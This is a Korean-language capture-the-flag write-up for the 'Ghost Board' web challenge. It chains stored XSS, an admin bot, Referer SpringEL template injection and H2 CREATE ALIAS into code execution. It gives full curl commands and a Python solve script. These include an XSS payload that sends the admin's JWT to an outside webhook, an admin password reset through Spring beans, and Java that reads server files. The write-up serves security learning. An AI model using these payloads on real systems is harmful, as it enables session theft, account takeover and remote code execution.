---
title: "[Web] Ghost Board"
description: Writeup for "Ghost Board" from 0xL4ugh CTF 2026.
date: 2026-01-26 01:00:00 +0900
categories: [CTF, 0xL4ugh CTF 2026]
tags: [Web]
toc: true
comments: false
render_with_liquid: false
---

# Ghost Board (0xL4ugh CTF 2026)

---

- **Name:** Ghost Board
- **Category:** Web
- **Connection:** `http://challenges.ctf.sd:34513`
- **Flag format:** `0xL4ugh{...}`

---

### 개요

게시판 서비스입니다.
글을 작성하고, 관리자 봇이 방문하게 할 수 있습니다.
목표는 서버의 `/flag-*.txt` 파일을 읽는 것입니다.

| 엔드포인트 | 설명 |
|---|---|
| `POST /api/boards` | 게시글 작성 (HTML 렌더링) |
| `POST /api/visit` | 관리자 봇이 우리 글을 방문하도록 트리거 |
| `GET /api/admin/dashboard` | 관리자 대시보드 (Referer SSTI 취약점) |

공격 흐름은 아래와 같습니다.

```
Stored XSS → 관리자 JWT 탈취 → Referer SSTI → Spring Bean 접근 → H2 ALIAS → 플래그 읽기
```

총 **4개의 취약점을 체이닝**해서 플래그를 얻습니다.

---

### 취약점 분석

#### 1. Stored XSS

게시글 내용이 **HTML을 그대로 렌더링**합니다.
별도의 sanitization이 없으므로, 아무 JavaScript나 삽입할 수 있습니다.

```html
<!-- 게시글 content에 삽입하면 그대로 실행됨 -->
<img src=x onerror="alert(1)">
```

#### 2. Admin Bot

`/api/visit`를 호출하면 관리자 봇이 우리 게시글을 열어줍니다.
즉, XSS 페이로드가 **관리자 권한으로 실행**됩니다.

관리자의 JWT는 `localStorage`에 저장되어 있으므로, XSS로 이를 탈취할 수 있습니다.

```javascript
// 이런 페이로드를 게시글에 심으면 됩니다
new Image().src = 'https://webhook.site/xxx?t=' + localStorage.getItem('token')
```

#### 3. Referer SSTI

`/api/admin/dashboard`는 `Referer` 헤더를 **Thymeleaf 템플릿에 그대로 삽입**해 SpringEL 표현식으로 평가합니다.

```
Referer: ' + ${7*7} + '
→ 응답에 "49" 포함 → SSTI 확인!
```

SpringEL은 `@beanName`으로 Spring Context의 모든 빈에 접근할 수 있기 때문에, 이 취약점이 치명적입니다.

#### 4. H2 Java ALIAS

H2 데이터베이스는 **Java 코드로 커스텀 함수를 정의**하는 `CREATE ALIAS` 기능을 지원합니다.

```sql
CREATE ALIAS myFunc AS $$ String myFunc() throws Exception {
    /* 여기에 임의의 Java 코드 */
} $$
```

SSTI로 `@jdbcTemplate` 빈에 접근해 이 SQL을 실행하면, **임의의 Java 코드를 서버에서 실행**할 수 있습니다.

---

### 취약점 체이닝 전략

취약점 4개를 어떻게 연결하는지 단계별로 살펴보겠습니다.

**Phase 1 — XSS로 관리자 JWT 탈취**

게시글에 XSS 페이로드를 삽입하고, 관리자 봇을 트리거합니다.
봇이 게시글을 열면, 페이로드가 실행되어 관리자의 JWT가 webhook으로 전송됩니다.

**Phase 2 — Referer SSTI로 관리자 비밀번호 변경**

탈취한 JWT로 `/api/admin/dashboard`에 접근합니다.
`Referer` 헤더에 SpringEL 표현식을 담아, `@userRepository` 빈을 통해 admin 계정의 비밀번호를 바꿉니다.

```
Referer: ' + ${{#u=@userRepository.findByUsername("admin").get(), ...}[3]} + '
```

이후 새 비밀번호로 로그인하면, 정식 admin JWT를 발급받을 수 있습니다.

> 탈취한 JWT를 바로 사용해도 되지만, 세션이 끊길 경우를 대비해 비밀번호 리셋 후 재로그인하는 것이 안정적입니다.

**Phase 3 — H2 ALIAS로 플래그 읽기**

admin JWT로 SSTI를 두 번 호출합니다.

1. `@jdbcTemplate.execute()`로 `GETFLAG` 함수를 생성합니다. 이 함수는 `/` 디렉터리를 순회해 `flag-`로 시작하는 파일을 찾아 내용을 반환합니다.
2. `@jdbcTemplate.queryForList()`로 `SELECT GETFLAG()`를 실행해 결과를 응답에서 추출합니다.

---

### Exploit 실행 과정

**Step 1 — 환경 설정 및 계정 생성**

```bash
export TARGET="http://challenges.ctf.sd:34513"

# 테스트 계정 생성 및 JWT 발급
TOKEN="$(
  curl -s -X POST "$TARGET/api/auth/register" \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"test"}' && \
  curl -s -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"test"}' \
  | jq -r ".token"
)"
```

**Step 2 — XSS 페이로드 게시**

[webhook.site](https://webhook.site)에서 URL을 발급받아 `WEBHOOK`에 지정합니다.

```bash
WEBHOOK="https://webhook.site/your-id-here"

curl -s -X POST "$TARGET/api/boards" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"title\":\"ghost\",\"content\":\"[].filter.constructor(\\\"new Image().src='$WEBHOOK?t='+localStorage.getItem('token')\\\")()\"}"
```

페이로드 설명: `[].filter.constructor(...)()`는 `Function` 생성자를 우회적으로 호출하는 방법입니다. `<script>` 태그 없이도 JavaScript를 실행할 수 있습니다.

**Step 3 — 관리자 봇 트리거 및 JWT 탈취**

```bash
curl -s -X POST "$TARGET/api/visit" -H "Authorization: Bearer $TOKEN"
```

webhook 대시보드에서 `?t=` 파라미터의 토큰 값을 복사합니다.

```bash
export ADMINJWT="eyJhbGci..."   # webhook에서 복사한 관리자 JWT
```

**Step 4 — SSTI 동작 확인**

```bash
curl -s "$TARGET/api/admin/dashboard" \
  -H "Authorization: Bearer $ADMINJWT" \
  -H $'Referer: \x27 + ${7*7} + \x27' \
| grep "49"
```

응답에 `49`가 포함되면 SSTI 정상 동작입니다.

**Step 5 — 관리자 비밀번호 리셋 및 재로그인**

```bash
# 비밀번호를 Admin!234567으로 변경
curl -s "$TARGET/api/admin/dashboard" \
  -H "Authorization: Bearer $ADMINJWT" \
  -H $'Referer: \x27 + ${{#u=@userRepository.findByUsername("admin").get(),#u.setPassword(@passwordEncoder.encode("Admin!234567")),@userRepository.save(#u),"OK"}[3]} + \x27'

# 새 비밀번호로 로그인해 정식 JWT 발급
ADMIN_TOKEN="$(
  curl -s -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"Admin!234567"}' \
  | jq -r ".token"
)"
```

**Step 6 — H2 ALIAS 생성**

```bash
curl -s "$TARGET/api/admin/dashboard" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H $'Referer: \x27 + ${@jdbcTemplate.execute(\'CREATE ALIAS IF NOT EXISTS GETFLAG AS $$ String getflag() throws Exception { try (java.util.stream.Stream<java.nio.file.Path> s = java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { java.nio.file.Path p = s.filter(x -> x.getFileName().toString().startsWith("flag-")).findFirst().orElse(null); return p==null?"NF":java.nio.file.Files.readString(p); } } $$\')} + \x27'
```

ALIAS 내부 Java 코드가 하는 일:
1. `/` 디렉터리의 파일 목록을 스트림으로 열기
2. `flag-`로 시작하는 파일 탐색
3. 찾았으면 파일 내용 반환, 없으면 `"NF"` 반환

**Step 7 — 플래그 획득**

```bash
curl -s "$TARGET/api/admin/dashboard" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H $'Referer: \x27 + ${@jdbcTemplate.queryForList(\'SELECT GETFLAG() AS F\')[0].get(\'F\')} + \x27' \
| grep -oE "0xL4ugh\{[^}]+\}"
```

실행 결과:

```
0xL4ugh{c0ngr47z_y0u_did_wh47_sh4d0w_did_in_bug_b0un7y_cef24d181cf97ee3342cfd5284e0bf57}
```

---

### Exploit 코드 (Python)

```python
#!/usr/bin/env python3
import argparse, re, sys, requests

TARGET = "http://challenges.ctf.sd:34513"

def ssti(s, target, jwt, expr):
    """Referer 헤더에 SpringEL 표현식을 삽입해 실행합니다."""
    r = s.get(
        f"{target}/api/admin/dashboard",
        headers={
            "Authorization": f"Bearer {jwt}",
            "Referer": "' + ${" + expr + "} + '"
        },
        timeout=20,
    )
    r.raise_for_status()
    return r.text

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default=TARGET)
    ap.add_argument("--adminjwt", required=True, help="XSS로 탈취한 관리자 JWT")
    ap.add_argument("--newpass", default="Admin!234567")
    args = ap.parse_args()

    s = requests.Session()
    target = args.target.rstrip("/")
    jwt = args.adminjwt.strip()
    newpass = args.newpass

    # 1) 관리자 비밀번호 리셋
    ssti(s, target, jwt,
         f'{{#u=@userRepository.findByUsername("admin").get(),'
         f'#u.setPassword(@passwordEncoder.encode("{newpass}")),'
         f'@userRepository.save(#u),"OK"}}[3]')
    print("[+] 관리자 비밀번호 변경 완료")

    # 2) 새 비밀번호로 로그인해 안정적인 JWT 획득
    resp = s.post(f"{target}/api/auth/login",
                  json={"username": "admin", "password": newpass}).json()
    token = resp.get("token")
    if not token:
        sys.exit("[!] 로그인 실패")
    print("[+] 관리자 토큰 획득 완료")

    # 3) H2 ALIAS 생성 (Java 코드로 플래그 파일 읽기)
    alias = (
        "CREATE ALIAS IF NOT EXISTS GETFLAG AS $$ "
        "String getflag() throws Exception { "
        "try (java.util.stream.Stream<java.nio.file.Path> s = "
        'java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { '
        "java.nio.file.Path p = s.filter(x -> x.getFileName().toString()"
        '.startsWith("flag-")).findFirst().orElse(null); '
        'return p==null?"NF":java.nio.file.Files.readString(p); } } $$'
    )
    ssti(s, target, token,
         f"@jdbcTemplate.execute('{alias.replace(chr(39), chr(39)*2)}')")
    print("[+] ALIAS 생성 완료")

    # 4) ALIAS 호출로 플래그 획득
    html = ssti(s, target, token,
                "@jdbcTemplate.queryForList('SELECT GETFLAG() AS F')[0].get('F')")
    m = re.search(r"0xL4ugh\{[^}]+\}", html)
    print("[+] FLAG:", m.group(0) if m else "플래그를 찾지 못했습니다")

if __name__ == "__main__":
    main()
```

**실행 방법:**

```bash
# 1. XSS로 관리자 JWT를 먼저 탈취한 뒤
python3 solve.py --adminjwt "eyJhbGci..."
```

---

### FLAG

```
0xL4ugh{c0ngr47z_y0u_did_wh47_sh4d0w_did_in_bug_b0un7y_cef24d181cf97ee3342cfd5284e0bf57}
```

---

### 요약

이 문제의 핵심은 **4개의 취약점을 순서대로 연결**하는 것입니다.

**1. Stored XSS — sanitization 없는 HTML 렌더링:**
게시글 내용이 그대로 HTML로 렌더링되어, JavaScript 코드를 삽입할 수 있습니다.

**2. Admin Bot — 대리 실행:**
`/api/visit`로 관리자 봇을 트리거하면, XSS 페이로드가 관리자 권한으로 실행됩니다. `localStorage`의 JWT를 탈취해 관리자 세션을 획득합니다.

**3. Referer SSTI — SpringEL 인젝션:**
`/api/admin/dashboard`가 `Referer` 헤더를 검증 없이 SpringEL 표현식으로 평가합니다. `@beanName`으로 Spring Context의 모든 빈에 접근할 수 있어, 사실상 서버 내부를 자유롭게 조작할 수 있습니다.

**4. H2 Java ALIAS — 임의 코드 실행:**
H2의 `CREATE ALIAS`는 Java 코드를 DB 함수로 등록하는 기능입니다. `@jdbcTemplate`을 통해 이 SQL을 실행하면, 파일 시스템 접근을 포함한 임의 Java 코드를 서버에서 실행할 수 있습니다.

각 취약점 단독으로는 임팩트가 제한적이지만, 체이닝하면 **비인증 사용자에서 임의 코드 실행(RCE)까지** 도달할 수 있습니다.
